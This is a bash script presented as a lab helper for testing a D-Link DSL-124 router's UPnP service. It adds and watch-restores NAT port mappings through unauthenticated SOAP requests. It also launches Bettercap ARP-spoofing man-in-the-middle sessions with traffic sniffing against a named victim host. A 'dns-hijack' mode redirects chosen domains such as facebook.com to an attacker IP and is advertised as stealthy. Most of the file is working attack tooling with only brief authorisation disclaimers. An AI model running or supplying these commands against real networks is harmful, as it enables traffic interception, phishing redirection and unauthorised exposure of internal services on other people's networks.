#!/usr/bin/env bash
#
# dsl124-upnp-lab.sh
#
# Purpose:
#   Controlled security-assessment helper for a D-Link DSL-124 / similar
#   UPnP IGD implementation in a lab you own or are explicitly authorized
#   to test.
#
# What it does:
#   - Detects the default gateway / local IPv4
#   - Checks reachability of the configured UPnP HTTP endpoint
#   - Lists UPnP NAT mappings (miniupnpc)
#   - Adds/removes TCP/UDP port mappings through SOAP
#   - Performs a SAFE description-field experiment (does NOT claim RCE)
#   - Watches a mapping and restores it if it disappears
#   - Starts a Bettercap ARP-MITM lab session
#   - DNS hijack (ARP spoofing + DNS spoofing) via Bettercap
#
# Requirements:
#   curl
#   iproute2 (ip)
#   miniupnpc (upnpc) for list/watch
#   bettercap for mitm and dns-hijack
#
# Example:
#   ./dsl124-upnp-lab.sh status
#   ./dsl124-upnp-lab.sh list
#   ./dsl124-upnp-lab.sh add 4444 22 192.168.1.7 TCP -y
#   ./dsl124-upnp-lab.sh delete 4444 TCP -y
#   ./dsl124-upnp-lab.sh test-description 4444 -y
#   ./dsl124-upnp-lab.sh watch 4444 22 192.168.1.7 TCP
#   sudo ./dsl124-upnp-lab.sh mitm 192.168.1.100
#   sudo ./dsl124-upnp-lab.sh dns-hijack 192.168.1.100 192.168.1.7 "facebook.com,*.google.com"
#
# Environment overrides:
#   ROUTER=192.168.1.1
#   ATTACKER=192.168.1.7
#   VICTIM=192.168.1.100
#   UPNP_PORT=5431
#   CONTROL_PATH=/control/WANIPConnection
#   LOG_FILE=upnp_lab.log
#

set -Eeuo pipefail
IFS=$'\n\t'

SCRIPT_NAME="$(basename "$0")"
VERSION="2.0"

# -----------------------------
# Configuration
# -----------------------------
DEFAULT_ROUTER="$(ip route show default 2>/dev/null | awk 'NR==1 {print $3}')"
DEFAULT_IFACE="$(ip route show default 2>/dev/null | awk 'NR==1 {print $5}')"
DEFAULT_IP=""

if [[ -n "${DEFAULT_IFACE:-}" ]]; then
    DEFAULT_IP="$(ip -4 addr show dev "$DEFAULT_IFACE" 2>/dev/null |
        awk '/inet / {sub(/\/.*/, "", $2); print $2; exit}')"
fi

ROUTER="${ROUTER:-${DEFAULT_ROUTER:-192.168.1.1}}"
ATTACKER="${ATTACKER:-${DEFAULT_IP:-}}"
VICTIM="${VICTIM:-}"
UPNP_PORT="${UPNP_PORT:-5431}"
CONTROL_PATH="${CONTROL_PATH:-/control/WANIPConnection}"
DESCRIPTION="${DESCRIPTION:-DSL124-UPnP-Lab}"
LOG_FILE="${LOG_FILE:-upnp_lab.log}"

CONNECT_TIMEOUT="${CONNECT_TIMEOUT:-3}"
MAX_TIME="${MAX_TIME:-10}"
WATCH_INTERVAL="${WATCH_INTERVAL:-60}"

# UPnP service used by the observed DSL-124 implementation.
SERVICE_TYPE="urn:schemas-upnp-org:service:WANIPConnection:1"
DEVICE_DESC_PATH="/igdevicedesc.xml"

# -----------------------------
# Output helpers
# -----------------------------
RED=$'\033[0;31m'
GREEN=$'\033[0;32m'
YELLOW=$'\033[1;33m'
BLUE=$'\033[0;34m'
NC=$'\033[0m'

log() {
    local msg="$*"
    printf '[%s] %s\n' "$(date '+%Y-%m-%d %H:%M:%S')" "$msg" | tee -a "$LOG_FILE"
}

info()  { printf '%s[+]%s %s\n' "$GREEN" "$NC" "$*"; }
warn()  { printf '%s[!]%s %s\n' "$YELLOW" "$NC" "$*"; }
error() { printf '%s[-]%s %s\n' "$RED" "$NC" "$*" >&2; }
die()   { error "$*"; exit 1; }

cleanup_tmp() {
    rm -f "${TMP_RESPONSE:-}" "${TMP_HEADERS:-}" "${TMP_REQUEST:-}" 2>/dev/null || true
}
trap cleanup_tmp EXIT

on_error() {
    local exit_code=$?
    error "Unexpected error at line ${BASH_LINENO[0]} (exit ${exit_code})."
    exit "$exit_code"
}
trap on_error ERR

# -----------------------------
# Validation
# -----------------------------
usage() {
    cat <<EOF
${SCRIPT_NAME} v${VERSION}

USAGE
  ${SCRIPT_NAME} [options] <command> [arguments]

OPTIONS
  -r, --router IP          Router IPv4 address (default: ${ROUTER})
  -a, --attacker IP        Local/attacker IPv4 address
  -v, --victim IP          Victim IPv4 address for MITM
  -p, --upnp-port PORT     UPnP HTTP port (default: ${UPNP_PORT})
  -y, --yes                Skip confirmation for state-changing actions
  -q, --quiet              Reduce informational output
  -h, --help               Show this help

COMMANDS
  status
      Show router/local interface information and test the UPnP HTTP endpoint.

  discover
      Fetch ${DEVICE_DESC_PATH} from the configured router.

  list
      Enumerate current NAT mappings using miniupnpc.

  add EXT_PORT INT_PORT TARGET_IP [TCP|UDP]
      Add a NAT mapping using AddPortMapping.

  delete EXT_PORT [TCP|UDP]
      Remove a NAT mapping using DeletePortMapping.

  test-description [EXT_PORT]
      Send a harmless description-field test. This is NOT an RCE proof.
      A response-time change alone must not be interpreted as command execution.

  watch EXT_PORT INT_PORT TARGET_IP [TCP|UDP]
      Re-check the mapping every ${WATCH_INTERVAL}s and restore it if missing.
      Stop with Ctrl+C.

  mitm VICTIM_IP
      Start a Bettercap ARP-MITM lab session against a specified LAN host.

  dns-hijack VICTIM_IP [FAKE_IP] [DOMAINS]
      Hijack DNS for the victim. Spoofs the given domains (or '*' for all)
      to resolve to FAKE_IP (default: your attacker IP). Uses ARP spoofing
      + DNS spoofing via bettercap. Stealthy, no victim config changed.
      Example: ${SCRIPT_NAME} dns-hijack 192.168.1.50 192.168.1.100 "facebook.com,*.google.com"

  help
      Show this help.

EXAMPLES
  ${SCRIPT_NAME} status
  ${SCRIPT_NAME} discover
  ${SCRIPT_NAME} list
  ${SCRIPT_NAME} add 4444 22 192.168.1.7 TCP -y
  ${SCRIPT_NAME} delete 4444 TCP -y
  ${SCRIPT_NAME} test-description 4444 -y
  ${SCRIPT_NAME} watch 4444 22 192.168.1.7 TCP
  sudo ${SCRIPT_NAME} mitm 192.168.1.100
  sudo ${SCRIPT_NAME} dns-hijack 192.168.1.100 192.168.1.7 "facebook.com"

NOTES
  - Use only on equipment/networks you own or are authorized to test.
  - An accepted AddPortMapping request proves port-mapping control,
    not command execution or RCE.
EOF
}

quiet=0
ASSUME_YES=0

info_msg() {
    (( quiet == 1 )) || info "$@"
}

require_cmd() {
    command -v "$1" >/dev/null 2>&1 || die "Missing dependency: $1"
}

require_root_if_needed() {
    [[ ${EUID:-$(id -u)} -eq 0 ]] || die "This operation requires root privileges."
}

valid_ipv4() {
    local ip=$1
    [[ "$ip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] || return 1

    local -a octets
    IFS='.' read -r -a octets <<< "$ip"
    [[ ${#octets[@]} -eq 4 ]] || return 1

    local o
    for o in "${octets[@]}"; do
        [[ "$o" =~ ^[0-9]+$ ]] || return 1
        (( 10#$o <= 255 )) || return 1
    done
}

valid_port() {
    local port=$1
    [[ "$port" =~ ^[0-9]+$ ]] || return 1
    (( port >= 1 && port <= 65535 ))
}

valid_protocol() {
    case "${1^^}" in
        TCP|UDP) return 0 ;;
        *) return 1 ;;
    esac
}

is_private_ipv4() {
    local ip=$1
    valid_ipv4 "$ip" || return 1

    local -a o
    IFS='.' read -r -a o <<< "$ip"

    local a=$((10#${o[0]}))
    local b=$((10#${o[1]}))

    if (( a == 10 )); then return 0; fi
    if (( a == 172 && b >= 16 && b <= 31 )); then return 0; fi
    if (( a == 192 && b == 168 )); then return 0; fi
    return 1
}

confirm() {
    (( ASSUME_YES == 1 )) && return 0

    local prompt="${1:-Continue?}"
    printf '%s [y/N] ' "$prompt"
    read -r reply
    [[ "$reply" =~ ^[Yy]$ ]]
}

normalize_protocol() {
    printf '%s' "${1^^}"
}

# -----------------------------
# HTTP/SOAP helpers
# -----------------------------
router_base() {
    printf 'http://%s:%s' "$ROUTER" "$UPNP_PORT"
}

soap_url() {
    printf '%s%s' "$(router_base)" "$CONTROL_PATH"
}

make_tmp() {
    TMP_RESPONSE="$(mktemp)"
    TMP_HEADERS="$(mktemp)"
    TMP_REQUEST="$(mktemp)"
}

soap_post() {
    local action="$1"
    local xml="$2"

    make_tmp
    printf '%s' "$xml" > "$TMP_REQUEST"

    if ! curl \
        --silent --show-error \
        --connect-timeout "$CONNECT_TIMEOUT" \
        --max-time "$MAX_TIME" \
        --fail-with-body \
        -D "$TMP_HEADERS" \
        -o "$TMP_RESPONSE" \
        -X POST "$(soap_url)" \
        -H "SOAPACTION: \"${SERVICE_TYPE}#${action}\"" \
        -H "Content-Type: text/xml; charset=\"utf-8\"" \
        --data-binary @"$TMP_REQUEST"
    then
        error "HTTP/SOAP request failed."
        [[ -s "$TMP_RESPONSE" ]] && sed 's/^/    /' "$TMP_RESPONSE" >&2
        return 1
    fi

    return 0
}

xml_escape() {
    # Escape XML text content.
    # Inputs are validated separately before use where appropriate.
    local s=$1
    s=${s//&/&amp;}
    s=${s//</&lt;}
    s=${s//>/&gt;}
    s=${s//\"/&quot;}
    s=${s//\'/&apos;}
    printf '%s' "$s"
}

add_xml() {
    local ext_port=$1
    local int_port=$2
    local target_ip=$3
    local protocol=$4
    local description
    description="$(xml_escape "$DESCRIPTION")"

    cat <<EOF
<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <u:AddPortMapping xmlns:u="${SERVICE_TYPE}">
      <NewRemoteHost></NewRemoteHost>
      <NewExternalPort>${ext_port}</NewExternalPort>
      <NewProtocol>${protocol}</NewProtocol>
      <NewInternalPort>${int_port}</NewInternalPort>
      <NewInternalClient>${target_ip}</NewInternalClient>
      <NewEnabled>1</NewEnabled>
      <NewPortMappingDescription>${description}</NewPortMappingDescription>
      <NewLeaseDuration>0</NewLeaseDuration>
    </u:AddPortMapping>
  </s:Body>
</s:Envelope>
EOF
}

delete_xml() {
    local ext_port=$1
    local protocol=$2

    cat <<EOF
<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <u:DeletePortMapping xmlns:u="${SERVICE_TYPE}">
      <NewRemoteHost></NewRemoteHost>
      <NewExternalPort>${ext_port}</NewExternalPort>
      <NewProtocol>${protocol}</NewProtocol>
    </u:DeletePortMapping>
  </s:Body>
</s:Envelope>
EOF
}

# -----------------------------
# Core operations
# -----------------------------
status() {
    require_cmd ip
    require_cmd curl

    echo "=== DSL-124 UPnP Lab ==="
    echo "Version     : $VERSION"
    echo "Router      : $ROUTER"
    echo "UPnP port   : $UPNP_PORT"
    echo "Control     : $(soap_url)"
    echo "Interface   : ${DEFAULT_IFACE:-unknown}"
    echo "Local IPv4  : ${ATTACKER:-unknown}"
    echo

    if valid_ipv4 "$ROUTER"; then
        if is_private_ipv4 "$ROUTER"; then
            info_msg "Router address is private IPv4."
        else
            warn "Router address is not in RFC1918 private space."
        fi
    else
        warn "Configured router value is not a valid IPv4 address: $ROUTER"
    fi

    info_msg "Testing device-description endpoint..."
    local code
    code="$(
        curl \
            --silent --show-error \
            --connect-timeout "$CONNECT_TIMEOUT" \
            --max-time "$MAX_TIME" \
            -o /dev/null \
            -w '%{http_code}' \
            "$(router_base)${DEVICE_DESC_PATH}" || true
    )"

    case "$code" in
        2??)
            info "UPnP HTTP endpoint reachable (HTTP $code)."
            ;;
        *)
            warn "UPnP HTTP endpoint returned HTTP ${code:-000}."
            ;;
    esac
}

discover() {
    require_cmd curl

    local url="$(router_base)${DEVICE_DESC_PATH}"
    log "Fetching device description: $url"

    curl \
        --silent --show-error \
        --connect-timeout "$CONNECT_TIMEOUT" \
        --max-time "$MAX_TIME" \
        "$url"
}

list_rules() {
    require_cmd upnpc

    local desc_url="$(router_base)${DEVICE_DESC_PATH}"
    log "Enumerating mappings using: $desc_url"

    upnpc -u "$desc_url" -l
}

add_forward() {
    require_cmd curl

    local ext_port="$1"
    local int_port="$2"
    local target_ip="$3"
    local protocol
    protocol="$(normalize_protocol "${4:-TCP}")"

    valid_port "$ext_port" || die "Invalid external port: $ext_port"
    valid_port "$int_port" || die "Invalid internal port: $int_port"
    valid_ipv4 "$target_ip" || die "Invalid target IPv4 address: $target_ip"
    valid_protocol "$protocol" || die "Protocol must be TCP or UDP."

    if ! is_private_ipv4 "$target_ip"; then
        warn "Target ${target_ip} is not RFC1918 private IPv4."
    fi

    echo "Requested mapping:"
    echo "  ${ext_port}/${protocol} -> ${target_ip}:${int_port}"
    confirm "Create this NAT mapping?" || { warn "Cancelled."; return 0; }

    log "Adding ${ext_port}/${protocol} -> ${target_ip}:${int_port}"

    local xml
    xml="$(add_xml "$ext_port" "$int_port" "$target_ip" "$protocol")"

    if soap_post "AddPortMapping" "$xml"; then
        info "Router accepted the AddPortMapping request."
        log "SUCCESS add ${ext_port}/${protocol} -> ${target_ip}:${int_port}"

        if grep -qiE '<[^>]*Fault|UPnPError|errorCode' "$TMP_RESPONSE"; then
            warn "Response contains a SOAP/UPnP fault indicator:"
            sed 's/^/    /' "$TMP_RESPONSE"
            return 1
        fi
        return 0
    fi

    log "FAILED add ${ext_port}/${protocol} -> ${target_ip}:${int_port}"
    return 1
}

delete_forward() {
    require_cmd curl

    local ext_port="$1"
    local protocol
    protocol="$(normalize_protocol "${2:-TCP}")"

    valid_port "$ext_port" || die "Invalid external port: $ext_port"
    valid_protocol "$protocol" || die "Protocol must be TCP or UDP."

    echo "Requested deletion:"
    echo "  ${ext_port}/${protocol}"
    confirm "Delete this NAT mapping?" || { warn "Cancelled."; return 0; }

    log "Deleting ${ext_port}/${protocol}"

    local xml
    xml="$(delete_xml "$ext_port" "$protocol")"

    if soap_post "DeletePortMapping" "$xml"; then
        if grep -qiE '<[^>]*Fault|UPnPError|errorCode' "$TMP_RESPONSE"; then
            warn "Router returned a SOAP/UPnP fault:"
            sed 's/^/    /' "$TMP_RESPONSE"
            log "FAILED delete ${ext_port}/${protocol}"
            return 1
        fi

        info "Router accepted the DeletePortMapping request."
        log "SUCCESS delete ${ext_port}/${protocol}"
        return 0
    fi

    log "FAILED delete ${ext_port}/${protocol}"
    return 1
}

test_description() {
    require_cmd curl

    local ext_port="${1:-11111}"
    valid_port "$ext_port" || die "Invalid test port: $ext_port"

    local marker="UPnP-LAB-TEST-$(date +%s)"
    local int_port="$ext_port"
    local target_ip="${ATTACKER:-}"

    valid_ipv4 "$target_ip" || die "A valid local --attacker IP is required for this test."

    echo "Description-field test:"
    echo "  Marker      : $marker"
    echo "  Mapping     : ${ext_port}/TCP -> ${target_ip}:${int_port}"
    echo
    warn "This test does NOT prove command execution."
    warn "Response timing alone is not evidence of RCE."

    confirm "Send the test mapping?" || { warn "Cancelled."; return 0; }

    local xml start_s end_s elapsed_ms
    xml="$(DESCRIPTION="$marker" add_xml "$ext_port" "$int_port" "$target_ip" TCP)"

    start_s="$(date +%s)"
    if soap_post "AddPortMapping" "$xml"; then
        end_s="$(date +%s)"
        elapsed_ms="$(( (end_s - start_s) * 1000 ))"

        # Check for SOAP/UPnP error in the response
        if grep -qiE '<[^>]*Fault|UPnPError|errorCode' "$TMP_RESPONSE"; then
            warn "SOAP fault received – mapping was NOT accepted."
            sed 's/^/    /' "$TMP_RESPONSE"
            return 1
        fi

        info "Request accepted in approximately ${elapsed_ms} ms."
        printf 'Response:\n'
        sed 's/^/  /' "$TMP_RESPONSE"

        echo
        warn "Interpretation: acceptance of the description string is evidence of"
        warn "input handling only. You need independent execution evidence before"
        warn "calling this command injection or RCE."

        # Best-effort cleanup – only if the mapping was added
        # Run deletion with -y and ignore errors
        (ASSUME_YES=1 delete_forward "$ext_port" TCP) || true
        return 0
    else
        warn "The HTTP request itself failed; mapping was not added."
        return 1
    fi
}

mapping_exists() {
    require_cmd upnpc

    local desc_url="$(router_base)${DEVICE_DESC_PATH}"
    upnpc -u "$desc_url" -l 2>/dev/null |
        awk -v p="$1" -v proto="$(normalize_protocol "$2")" '
            BEGIN { found=0 }
            $0 ~ ("external port " p " " proto) { found=1 }
            END { exit(found ? 0 : 1) }
        '
}

watch_mapping() {
    require_cmd upnpc
    require_cmd curl

    local ext_port="$1"
    local int_port="$2"
    local target_ip="$3"
    local protocol
    protocol="$(normalize_protocol "${4:-TCP}")"

    valid_port "$ext_port" || die "Invalid external port."
    valid_port "$int_port" || die "Invalid internal port."
    valid_ipv4 "$target_ip" || die "Invalid target IPv4."
    valid_protocol "$protocol" || die "Protocol must be TCP or UDP."

    warn "Watch mode continuously restores a NAT mapping if it disappears."
    echo "  Mapping: ${ext_port}/${protocol} -> ${target_ip}:${int_port}"
    echo "  Interval: ${WATCH_INTERVAL}s"
    confirm "Start watch mode?" || { warn "Cancelled."; return 0; }

    trap 'echo; info "Watch mode stopped."; exit 0' INT TERM

    while true; do
        if mapping_exists "$ext_port" "$protocol"; then
            info_msg "Mapping ${ext_port}/${protocol} appears present."
        else
            warn "Mapping ${ext_port}/${protocol} not found; attempting restore."
            # Bypass confirmation for automated restoration
            if ASSUME_YES=1 add_forward "$ext_port" "$int_port" "$target_ip" "$protocol"; then
                info "Mapping restored."
            else
                error "Mapping restore failed."
            fi
        fi
        sleep "$WATCH_INTERVAL"
    done
}

dns_hijack() {
    require_cmd bettercap
    require_cmd ip
    require_root_if_needed

    local victim_ip="$1"
    local fake_ip="${2:-$ATTACKER}"
    local domains="${3:-*}"
    local iface="${DEFAULT_IFACE:-}"

    valid_ipv4 "$victim_ip" || die "Invalid victim IPv4: $victim_ip"
    valid_ipv4 "$fake_ip"   || die "Invalid fake IPv4: $fake_ip"
    [[ -n "$iface" ]]       || die "Could not determine default interface."

    # Validate that victim is reachable via the same interface
    local victim_iface
    victim_iface="$(ip route get "$victim_ip" 2>/dev/null | awk '{for(i=1;i<=NF;i++){if($i=="dev"){print $(i+1); exit}}}')"
    [[ -n "$victim_iface" ]] || die "Cannot reach victim $victim_ip"
    [[ "$victim_iface" == "$iface" ]] || die "Victim not on the same interface as default gateway."

    warn "DNS Hijack mode: all traffic for selected domains will be redirected to $fake_ip."
    warn "Domains affected: $domains"
    echo "Victim   : $victim_ip"
    echo "Attacker : $ATTACKER"
    echo "Fake IP  : $fake_ip"
    echo "Interface: $iface"
    echo

    confirm "Start DNS hijack?" || { warn "Cancelled."; return 0; }

    log "Starting DNS hijack: victim=$victim_ip fake=$fake_ip domains=$domains"

    exec bettercap -iface "$iface" -eval "
        net.probe on;
        set arp.spoof.targets $victim_ip;
        set arp.spoof.fullduplex true;
        set arp.spoof.forwarding true;
        arp.spoof on;
        set dns.spoof.address $fake_ip;
        set dns.spoof.domains $domains;
        dns.spoof on;
        net.sniff on;
        events.stream off
    "
}

mitm() {
    require_cmd bettercap
    require_cmd ip
    require_root_if_needed

    local victim_ip="$1"
    local iface="${DEFAULT_IFACE:-}"

    valid_ipv4 "$victim_ip" || die "Invalid victim IPv4 address: $victim_ip"
    valid_ipv4 "$ROUTER" || die "Invalid router IPv4 address: $ROUTER"
    valid_ipv4 "$ATTACKER" || die "A valid attacker IPv4 address is required for MITM mode."

    [[ -n "$iface" ]] || die "Could not determine the default network interface."

    if ! is_private_ipv4 "$victim_ip"; then
        die "MITM target must be RFC1918 private IPv4 in this lab tool."
    fi

    if [[ "$victim_ip" == "$ROUTER" ]]; then
        die "The victim cannot be the configured gateway ($ROUTER)."
    fi

    if [[ "$victim_ip" == "$ATTACKER" ]]; then
        die "The victim cannot be the attacker host ($ATTACKER)."
    fi

    if [[ "$ATTACKER" == "$ROUTER" ]]; then
        die "Attacker and router addresses cannot be identical."
    fi

    # Verify that traffic to the victim uses the same interface
    # on which Bettercap will perform the ARP MITM.
    local victim_iface
    victim_iface="$(
        ip route get "$victim_ip" 2>/dev/null |
            awk '
                {
                    for (i = 1; i <= NF; i++) {
                        if ($i == "dev" && (i + 1) <= NF) {
                            print $(i + 1)
                            exit
                        }
                    }
                }
            '
    )"

    [[ -n "$victim_iface" ]] ||
        die "Could not determine the interface used to reach victim $victim_ip."

    [[ "$victim_iface" == "$iface" ]] ||
        die "Victim $victim_ip is reached through $victim_iface, not the MITM interface $iface."

    warn "MITM mode actively redirects LAN traffic through this host."
    warn "Use only on a network and target you are explicitly authorized to test."

    echo "Interface : $iface"
    echo "Router    : $ROUTER"
    echo "Attacker  : $ATTACKER"
    echo "Victim    : $victim_ip"
    echo

    confirm "Start Bettercap ARP spoofing?" ||
        { warn "Cancelled."; return 0; }

    log "Starting Bettercap ARP-MITM"
    log "Interface=$iface router=$ROUTER attacker=$ATTACKER victim=$victim_ip"

    # Discovery is started before ARP spoofing so Bettercap can populate
    # its endpoint table. The victim is the spoof target; with full-duplex
    # enabled, Bettercap also poisons the gateway relationship.
    exec bettercap \
    -iface "$iface" \
    -eval "net.probe on; set arp.spoof.targets $victim_ip; set arp.spoof.fullduplex true; set arp.spoof.forwarding true; arp.spoof on; net.sniff on"
}

# -----------------------------
# Argument parsing
# -----------------------------
[[ $# -gt 0 ]] || { usage; exit 1; }

COMMAND=""

while [[ $# -gt 0 ]]; do
    case "$1" in
        -r|--router)
            [[ $# -ge 2 ]] || die "$1 requires an argument."
            ROUTER="$2"
            shift 2
            ;;
        -a|--attacker)
            [[ $# -ge 2 ]] || die "$1 requires an argument."
            ATTACKER="$2"
            shift 2
            ;;
        -v|--victim)
            [[ $# -ge 2 ]] || die "$1 requires an argument."
            VICTIM="$2"
            shift 2
            ;;
        -p|--upnp-port)
            [[ $# -ge 2 ]] || die "$1 requires an argument."
            UPNP_PORT="$2"
            shift 2
            ;;
        -y|--yes)
            ASSUME_YES=1
            shift
            ;;
        -q|--quiet)
            quiet=1
            shift
            ;;
        -h|--help)
            usage
            exit 0
            ;;
        --version)
            echo "$SCRIPT_NAME $VERSION"
            exit 0
            ;;
        -*)
            die "Unknown option: $1"
            ;;
        *)
            COMMAND="$1"
            shift
            break
            ;;
    esac
done

# Basic global validation.
valid_ipv4 "$ROUTER" || die "Invalid router IPv4 address: $ROUTER"
valid_port "$UPNP_PORT" || die "Invalid UPnP HTTP port: $UPNP_PORT"

case "$COMMAND" in
    status)
        status
        ;;
    discover)
        discover
        ;;
    list)
        list_rules
        ;;
    add)
        [[ $# -ge 3 && $# -le 4 ]] || die "Usage: $SCRIPT_NAME add EXT_PORT INT_PORT TARGET_IP [TCP|UDP]"
        add_forward "$@"
        ;;
    delete)
        [[ $# -ge 1 && $# -le 2 ]] || die "Usage: $SCRIPT_NAME delete EXT_PORT [TCP|UDP]"
        delete_forward "$@"
        ;;
    test-description)
        [[ $# -le 1 ]] || die "Usage: $SCRIPT_NAME test-description [EXT_PORT]"
        test_description "$@"
        ;;
    watch)
        [[ $# -ge 3 && $# -le 4 ]] || die "Usage: $SCRIPT_NAME watch EXT_PORT INT_PORT TARGET_IP [TCP|UDP]"
        watch_mapping "$@"
        ;;
    mitm)
        local_victim="${1:-${VICTIM:-}}"
        [[ $# -eq 1 || -n "$local_victim" ]] || die "Usage: $SCRIPT_NAME mitm VICTIM_IP"
        mitm "$local_victim"
        ;;
    dns-hijack)
        victim="${1:-}"
        fake="${2:-$ATTACKER}"
        domains="${3:-*}"
        [[ -n "$victim" ]] || die "Usage: $SCRIPT_NAME dns-hijack VICTIM_IP [FAKE_IP] [DOMAINS]"
        dns_hijack "$victim" "$fake" "$domains"
        ;;
    help)
        usage
        ;;
    *)
        error "Unknown or missing command: ${COMMAND:-<none>}"
        echo
        usage
        exit 2
        ;;
esac
